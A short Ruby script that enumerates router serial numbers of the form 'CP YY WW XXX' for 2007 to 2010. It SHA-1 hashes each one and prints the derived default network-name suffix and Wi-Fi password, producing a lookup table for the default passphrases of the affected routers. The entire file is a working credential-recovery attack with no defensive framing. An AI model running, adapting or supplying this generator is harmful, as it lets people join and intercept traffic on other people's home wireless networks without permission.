require 'digest/sha1'

# serial number: 	CP 08 17 AH 1AB (A1)
# 					CP YY WW PP XXX (CC)
# 					CP YY WW    XXX

def string_to_hex(s)
	final = ''
	for i in 0...s.length
		final << s[i].to_s(16)
	end
	return final
end

# xxx should already be a string with the chars's hex values, like: '314243'
def get_ssid_and_pass(year, week, xxx)
	year = "0#{year}" if year < 10
	week = "0#{week}" if week < 10
	sha1 = Digest::SHA1.hexdigest("CP#{year}#{week}#{xxx}")
	return sha1[34,6], sha1[0,10]
end

# hex values for chars: 0-9 + A-Z
CHARS = ['30','31','32','33','34','35','36','37','38','39','41','42','43','44','45','46','47','48','49','4A','4B','4C','4D','4E','4F','50','51','52','53','54','55','56','57','58','59','5A']


for year in 7..10
	for week in 0...52
		CHARS.each do |x1|
			CHARS.each do |x2|
				CHARS.each do |x3|
					ssid, pass = get_ssid_and_pass(year,week,x1+x2+x3)
					puts "#{ssid} #{pass}"
				end
			end
		end
	end
end
